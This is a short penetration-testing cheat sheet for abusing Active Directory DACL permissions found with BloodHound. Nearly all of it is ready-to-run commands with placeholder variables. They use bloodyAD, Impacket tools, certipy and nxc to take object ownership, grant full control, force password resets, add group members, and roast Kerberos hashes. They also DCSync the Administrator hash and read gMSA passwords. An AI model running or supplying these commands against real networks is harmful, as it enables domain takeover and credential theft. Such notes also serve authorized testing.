# DACL Abuse

## From BloodHound

```powershell
# Fix clock skew
sudo ntpdate $IP

# Enter powerview.py
powerview $DOMAIN/$USER:'$PASSWD'@$TARGET

# WriteOwner
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p $PASSWD set owner $OBJECT $OUR_USER
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p $PASSWD add genericAll $OBJECT $OUR_USER

# GenericAll
targetedKerberoast.py -d $DOMAIN -u $USER -p '$PASSWD' --request-user $TARGET_USER # 13100
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p '$PASSWD' add uac $OBJECT -f DONT_REQ_PREAUTH # 18200
GetNPUsers.py -request -outputfile hashes.asreproast $DOMAIN/$USER:'$PASSWD'

certipy shadow auto -u $USER@$DOMAIN -p '$PASSWD' -target $TARGET -account $TARGET_USER
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p $PASSWD set password $TARGET_USER $NEW_PASSWD

# GenericAll over OU
dacledit.py -action 'write' -rights 'FullControl' -principal $OUR_USER -target-dn '$OBJECT' -inheritance $DOMAIN/$USER:'$PASSWD' -dc-ip $IP

# GenericWrite
targetedKerberoast.py -d $DOMAIN -u $USER -p '$PASSWD' --request-user $TARGET_USER # 13100
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p '$PASSWD' add uac $OBJECT -f DONT_REQ_PREAUTH # 18200

# WriteDacl
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p $PASSWD add genericAll $OBJECT $OUR_USER

# ForceChangePassword
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p $PASSWD set password $TARGET_USER $NEW_PASSWD

# AddMembers/AddSelf
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p '$PASSWD' add groupMember $GROUP $MEMBER

# DCSync
secretsdump.py $DOMAIN/$USER:'$PASSWD'@$TARGET -just-dc-user Administrator

# ReadGMSAPassword
nxc ldap $TARGET -u $USER -p '$PASSWD' --gmsa
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p '$PASSWD' get object '$GMSA_ACCOUNT' --attr msDS-ManagedPassword

# Enable account
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p '$PASSWD' remove uac $TARGET -f ACCOUNTDISABLE
```

## Reference

![](0%20Attachments/DACL%20abuse%20mindmap.png)
